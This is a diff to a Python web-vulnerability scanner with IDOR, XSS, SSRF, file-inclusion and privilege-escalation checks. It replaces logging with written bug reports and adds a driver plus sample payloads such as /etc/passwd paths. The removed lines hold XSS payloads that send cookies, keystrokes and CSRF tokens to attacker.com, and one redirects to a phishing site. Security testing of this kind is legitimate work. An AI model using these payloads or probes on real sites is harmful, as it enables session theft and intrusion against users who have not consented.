@@ -24,7 +24,8 @@ def test_idor(endpoint, param, user_ids, cookies=None):
         log_step(f"Response Status Code: {response.status_code}")
         
         if response.status_code == 200:
-            log_step(f"Potential IDOR vulnerability: Access granted for {user_id}")
+            with open('vulnerability_reports/idor.txt', 'a') as report_file:
+                report_file.write(f"Bug Type: IDOR\nBug Location: {url}\nDescription: IDOR vulnerability with user ID '{user_id}'\nHow to Replicate: Access URL {url} directly\nSolution: Implement proper access controls and authorization checks.\n\n")
         else:
             log_step(f"Access denied for {user_id}")
 
@@ -37,25 +38,8 @@ def test_xss(endpoint, param, payloads, cookies=None):
         log_step(f"Response Status Code: {response.status_code}")
         
         if payload in response.text:
-            log_step(f"Potential XSS vulnerability detected with payload '{payload}'")
-
-            # Escalation techniques
-            escalated_payloads = [
-                "<script>document.location='http://attacker.com?cookie='+document.cookie</script>",
-                "<script>window.location='http://phishing-site.com'</script>",
-                "<script>document.onkeypress=function(e){fetch('http://attacker.com/log?key='+String.fromCharCode(e.which));}</script>",
-                "<script>fetch('http://attacker.com/log?csrf_token='+document.querySelector('[name=\"csrf_token\"]').value);</script>",
-                "<script>document.body.innerHTML='Hacked!';</script>"
-            ]
-
-            for esc_payload in escalated_payloads:
-                esc_url = f"{endpoint}?{param}={esc_payload}"
-                esc_response = requests.get(esc_url, cookies=cookies)
-                log_step(f"Testing XSS escalation with payload: {esc_payload}")
-                log_step(f"Response Status Code: {esc_response.status_code}")
-        
-        else:
-            log_step(f"No XSS vulnerability detected with payload '{payload}'")
+            with open('vulnerability_reports/xss_cut.txt', 'a') as report_file:
+                report_file.write(f"Bug Type: XSS\nBug Location: {endpoint}\nDescription: XSS attempt with payload '{payload}'\nHow to Replicate: Send payload '{payload}' to parameter '{param}' at {endpoint}\nSolution: Use proper escaping and Content Security Policy (CSP).\n\n")
 
 def test_ssrf(endpoint, param, urls, cookies=None):
     for url in urls:
@@ -65,9 +49,8 @@ def test_ssrf(endpoint, param, urls, cookies=None):
         log_step(f"Response Status Code: {response.status_code}")
         
         if response.status_code == 200:
-            log_step(f"Potential SSRF vulnerability with URL: {url}")
-        else:
-            log_step(f"SSRF attempt denied for URL: {url}")
+            with open('vulnerability_reports/ssrf.txt', 'a') as report_file:
+                report_file.write(f"Bug Type: SSRF\nBug Location: {endpoint}\nDescription: SSRF attempt with URL '{url}'\nHow to Replicate: Send URL '{url}' to parameter '{param}' at {endpoint}\nSolution: Validate and sanitize URL inputs and restrict outbound connections.\n\n")
 
 def test_lfi_rfi(endpoint, param, paths, cookies=None):
     for path in paths:
@@ -77,9 +60,8 @@ def test_lfi_rfi(endpoint, param, paths, cookies=None):
         log_step(f"Response Status Code: {response.status_code}")
         
         if "sensitive_data" in response.text:
-            log_step(f"Potential File Inclusion vulnerability with path '{path}'")
-        else:
-            log_step(f"No File Inclusion detected with path '{path}'")
+            with open('vulnerability_reports/file_inclusion.txt', 'a') as report_file:
+                report_file.write(f"Bug Type: File Inclusion\nBug Location: {endpoint}\nDescription: File Inclusion attempt with path '{path}'\nHow to Replicate: Send path '{path}' to parameter '{param}' at {endpoint}\nSolution: Validate and sanitize file paths.\n\n")
 
 def test_privilege_escalation(endpoint, param, cookies, low_privilege_cookies):
     response = requests.get(f"{endpoint}?{param}", cookies=low_privilege_cookies)
@@ -88,6 +70,45 @@ def test_privilege_escalation(endpoint, param, cookies, low_privilege_cookies):
     log_step(f"Response Status Code: {response.status_code}")
     
     if response.status_code == 200:
-        log_step(f"Potential Privilege Escalation vulnerability detected")
+        with open('vulnerability_reports/privilege_escalation.txt', 'a') as report_file:
+            report_file.write(f"Bug Type: Privilege Escalation\nBug Location: {endpoint}\nDescription: Privilege Escalation vulnerability with low privilege user\nHow to Replicate: Access {endpoint} with low privilege cookies\nSolution: Implement role-based access controls and proper authentication.\n\n")
     else:
-        log_step
+        log_step(f"No Privilege Escalation vulnerability detected")
+
+def run_cut(file_path, user_ids, xss_payloads, ssrf_urls, file_paths, low_privilege_cookies):
+    vulnerabilities = load_vulnerabilities(file_path)
+    if not vulnerabilities:
+        print(f"No vulnerabilities loaded from {file_path}")
+        return
+
+    for vuln in vulnerabilities:
+        vuln_data = vuln.strip().split(',')
+        endpoint = vuln_data[0]
+        param = vuln_data[1]
+        vuln_type = vuln_data[2]
+        
+        log_step(f"Escalating {vuln_type} vulnerability at {endpoint} with parameter {param}")
+        
+        if vuln_type == 'IDOR':
+            test_idor(endpoint, param, user_ids)
+        elif vuln_type == 'XSS':
+            test_xss(endpoint, param, xss_payloads)
+        elif vuln_type == 'SSRF':
+            test_ssrf(endpoint, param, ssrf_urls)
+        elif vuln_type == 'File Inclusion':
+            test_lfi_rfi(endpoint, param, file_paths)
+        elif vuln_type == 'Privilege Escalation':
+            test_privilege_escalation(endpoint, param, {}, low_privilege_cookies)
+        else:
+            log_step(f"Unknown vulnerability type: {vuln_type}")
+
+if __name__ == '__main__':
+    # This part is only for standalone testing
+    file_path = input("Please enter the file path for detected vulnerabilities: ")
+    user_ids = ['1', '2', '3']
+    xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
+    ssrf_urls = ['http://localhost:8000', 'http://example.com']
+    file_paths = ['/etc/passwd', '../etc/passwd']
+    low_privilege_cookies = {}  # Example low privilege cookies
+
+    run_cut(file_path, user_ids, xss_payloads, ssrf_urls, file_paths, low_privilege_cookies)
